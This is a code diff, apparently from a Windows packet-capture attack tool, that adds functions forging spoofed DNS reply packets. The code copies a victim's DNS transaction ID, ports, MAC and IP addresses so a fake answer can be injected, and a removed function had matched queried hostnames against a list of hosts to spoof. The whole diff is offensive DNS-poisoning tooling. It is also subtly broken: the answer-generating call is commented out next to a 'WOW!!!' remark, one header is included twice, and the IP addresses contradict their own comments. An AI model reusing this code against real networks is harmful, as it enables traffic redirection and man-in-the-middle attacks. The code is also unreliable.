@@ -2,153 +2,132 @@
 
 #include <pcap.h>
 #include <windows.h>
-#include <winsock2.h>
-#include <Ws2tcpip.h>
-#include <Shlwapi.h>
+#include <stdio.h>
 
 #include "APE.h"
+#include "DnsForge.h"
+#include "DnsResponsePoisoning.h"
 #include "LinkedListSpoofedDnsHosts.h"
-#include "DNSResponsePoisoning.h"
+#include "DnsResponsePoisoning.h"
 #include "NetDns.h"
 
-extern PHOSTNODE gHostsList;
 
 
-/*
- *
- *
- */
-void *DnsResponsePoisonerGetHost2Spoof(u_char *dataParam)
+int BuildSpoofedDnsReplyPacket(unsigned char *pRawPacket, int pRawPacketLen, PHOSTNODE pNode, char *pOutputBuffer, int *pOutputBufferLen)
 {
-  PETHDR ethrHdr = (PETHDR)dataParam;
+  int dnsSpoofingPacketsize = 0;
+  int etherPacketSize = sizeof(ETHDR);
+  int ipPacketSize = sizeof(IPHDR);
+  int udpPacketSize = sizeof(UDPHDR);
+  int dnsPacketSize = sizeof(DNS_BASIC) + sizeof(DNS_QUERY) + sizeof(DNS_ANSWER);
+  unsigned short dstPort = 0;
+  unsigned short srcPort = 0;
+  PETHDR ethrHdr = (PETHDR)pRawPacket;
   PIPHDR ipHdr = NULL;
-  PUDPHDR udpHdr = NULL;
-  int ipHdrLen = 0;
-  char *data = NULL;
-  char *dnsData = NULL;
-  PHOSTNODE retVal = NULL;
-  PHOSTNODE tmpNode = NULL;
-  PDNS_HDR dnsHdr = NULL;
-  unsigned char *reader = NULL;
-  int stop;
-  unsigned char *peerName = NULL;
+  PUDPHDR updHdr = NULL;
+  PUDPHDR updHdr2 = NULL;
+  IPADDRESS saddr, daddr;
+  PDNS_BASIC dnsBasicHdr = NULL;
+  PDNS_BASIC dnsAnswerHdr = NULL;
+  unsigned long ulTmp = 0;
+  unsigned short transactionId = 0;
+  int counter = 0;
+  int dnsUrlCounter = 0;
+  unsigned char dnsUrlA[512];
+  unsigned char *dnsUrl = NULL;
+  unsigned char binDestMac[BIN_MAC_LEN];
+  unsigned char binSrcMac[BIN_MAC_LEN];
 
+  // Initialize output buffer
+  ZeroMemory(pOutputBuffer, *pOutputBufferLen);
+  *pOutputBufferLen = 0;
 
-  if (ethrHdr == NULL || htons(ethrHdr->ether_type) != ETHERTYPE_IP)
+  // Copy destination and source MAC addresses
+  CopyMemory(binSrcMac, ethrHdr->ether_dhost, BIN_MAC_LEN);
+  CopyMemory(binDestMac, ethrHdr->ether_shost, BIN_MAC_LEN);
+
+  // IP Header
+  ipHdr = (PIPHDR)(pRawPacket + etherPacketSize);
+  saddr = ipHdr->saddr;
+  daddr = ipHdr->daddr;
+
+  // Copy UDP src(client) and dest(dns server) port
+  updHdr2 = (PUDPHDR)(pRawPacket + etherPacketSize + ipPacketSize);
+  srcPort = ntohs(updHdr2->sport);
+  dstPort = ntohs(updHdr2->dport);
+
+  // DNS basic header	
+  dnsBasicHdr = (PDNS_BASIC)(pRawPacket + etherPacketSize + ipPacketSize + udpPacketSize);
+
+  //copy the transaction id 
+  transactionId = dnsBasicHdr->trans_id;
+  dnsUrl = (unsigned char *)(pRawPacket + etherPacketSize + ipPacketSize + udpPacketSize + sizeof(DNS_BASIC));
+  
+  // Copy requested hostname
+  ZeroMemory(dnsUrlA, sizeof(dnsUrlA));
+  for (dnsUrlCounter = 0; dnsUrl[dnsUrlCounter] != 0; dnsUrlCounter++)
   {
-    return retVal;
+    dnsUrlA[dnsUrlCounter] = dnsUrl[dnsUrlCounter];
   }
 
-  ipHdr = (PIPHDR)(dataParam + 14);
+  dnsUrlA[dnsUrlCounter] = 0;
+  dnsUrlCounter++;
 
-  if (ipHdr == NULL || ipHdr->proto != IP_PROTO_UDP)
-  {
-    return retVal;
-  }
+  // Obtain the total attack packet size
+  dnsSpoofingPacketsize = dnsUrlCounter + etherPacketSize + ipPacketSize + udpPacketSize + dnsPacketSize;
 
-  ipHdrLen = (ipHdr->ver_ihl & 0xf) * 4;
+  // Generate ethernet header for lDNSPacket
+  GenerateEthernetPacket((unsigned char *)pOutputBuffer, (unsigned char *)binDestMac, (unsigned char *)binSrcMac);
+  
+  // Generate IP header for lDNSPacket
+  ipHdr = (PIPHDR)(pOutputBuffer + etherPacketSize);
+  GenerateIpPacket((unsigned char *)ipHdr, IPPROTO_UDP, saddr, daddr, dnsSpoofingPacketsize);
 
-  if (ipHdrLen <= 0)
-  {
-    return retVal;
-  }
+  // Generate UDP header for lDNSPacket
+  updHdr = (PUDPHDR)((unsigned char *)ipHdr + ipPacketSize);
+  GenerateUdpPacket((unsigned char *)updHdr, dnsSpoofingPacketsize, srcPort, dstPort);
 
-  udpHdr = (PUDPHDR)((unsigned char*)ipHdr + ipHdrLen);
+  // Generate DNS header for lDNSPacket
+  dnsAnswerHdr = (PDNS_BASIC)((unsigned char *)updHdr + udpPacketSize);
 
-  if (udpHdr == NULL || udpHdr->ulen <= 0 || ntohs(udpHdr->sport) != UDP_DNS)
-  {
-    return retVal;
-  }
+// WOW!!!
+//GenerateDnsPacket_A((unsigned char *)dnsAnswerHdr, dnsUrlCounter, dnsUrlA, transactionId, (char *)pNode->sData.SpoofedIP);
+  *pOutputBufferLen = dnsSpoofingPacketsize;
 
-  dnsData = ((char*)udpHdr + sizeof(UDPHDR));
-  dnsHdr = (PDNS_HDR)&dnsData[sizeof(DNS_HDR)];
-
-  if (dnsHdr == NULL)
-  {
-    return retVal;
-  }
-
-  if (ntohs(dnsHdr->q_count) <= 0)
-  {
-    return retVal;
-  }
-
-  reader = (unsigned char *)&dnsData[sizeof(DNS_HDR)];
-  stop = 0;
-  peerName = dns2Text(reader, (unsigned char *)dnsHdr, &stop);
-
-  if ((tmpNode = GetNodeByHostname(gHostsList, peerName)) != NULL)
-  {
-    retVal = tmpNode;
-  }
-
-  return retVal;
+  return 1;
 }
 
 
-/*
- * From dns2Text
- *
- */
-unsigned char* dns2Text(unsigned char* reader, unsigned char* buffer, int *count)
+void GenerateEthernetPacket(unsigned char * packet, unsigned char * dest, unsigned char * source)
 {
-  unsigned char *name;
-  unsigned int p = 0;
-  unsigned int jumped = 0;
-  unsigned int offset;
-  int i;
-  int j;
+  PETHDR ethrHdr = (PETHDR)packet;
+  int counter;
 
-  *count = 1;
-  name = (unsigned char*)malloc(256);
-  name[0] = '\0';
+  // Handle the MAC of source and destination of packet
+  for (counter = 0; counter < BIN_MAC_LEN; counter++)
+    ethrHdr->ether_dhost[counter] = source[counter];
 
-  // Read the names in 3www6google3com format
-  while (*reader != 0)
-  {
-    if (*reader >= 192)
-    {
-      offset = (*reader) * 256 + *(reader + 1) - 49152; //49152 = 11000000 00000000 ;)
-      reader = buffer + offset - 1;
-      jumped = 1; //we have jumped to another location so counting wont go up!
-    }
-    else
-    {
-      name[p++] = *reader;
-    }
+  for (counter = 0; counter < BIN_MAC_LEN; counter++)
+    ethrHdr->ether_shost[counter] = dest[counter];
 
-    reader = reader + 1;
-
-    if (jumped == 0)
-    {
-      *count += 1; //if we havent jumped to another location then we can count up    
-    }
-  }
-
-  name[p] = '\0'; //string complete
-
-  if (jumped == 1)
-  {
-    *count = *count + 1; //number of steps we actually moved forward in the packet
-  }
-
-
-  //now convert 3www6google3com0 to www.google.com
-  for (i = 0; i < (int)strlen((const char*)name); i++)
-  {
-    p = name[i];
-    for (j = 0; j < (int)p; j++)
-    {
-      name[i] = name[i + 1];
-      i++;
-    }
-
-    name[i] = '.';
-  }
-
-  name[i - 1] = '\0'; //remove the last dot
-
-  return name;
+  ethrHdr->ether_type = htons(0x0800);  //type of ethernet header
 }
 
 
+void GenerateIpPacket(unsigned char *packet, unsigned char ipProtocol, IPADDRESS srcAddr, IPADDRESS dstAddr, unsigned short dnsPacketSize)
+{
+  PIPHDR ipHdr = (PIPHDR)packet;
+
+  // Fill up fields in ip header 
+  ipHdr->ver_ihl = 0x45;	//version of IP header = 4
+  ipHdr->tos = 0x00;		//type of service
+  dnsPacketSize = dnsPacketSize - sizeof(ETHDR);
+  ipHdr->tlen = htons(dnsPacketSize); //length of packet
+  ipHdr->identification = htons((unsigned short)GetCurrentProcessId()); //packet identification=process ID
+  ipHdr->flags_fo = htons(0x0000);//fragment offset field and u16_flags
+  ipHdr->ttl = 0x3a; 	//time to live  
+  ipHdr->proto = ipProtocol; //protocol;
+  ipHdr->saddr = srcAddr;	//source IP address = dns server
+  ipHdr->daddr = dstAddr;	//destination IP address = client
+  ipHdr->crc = (unsigned short)in_cksum((unsigned short *)ipHdr, sizeof(IPHDR));//check_sum
+}
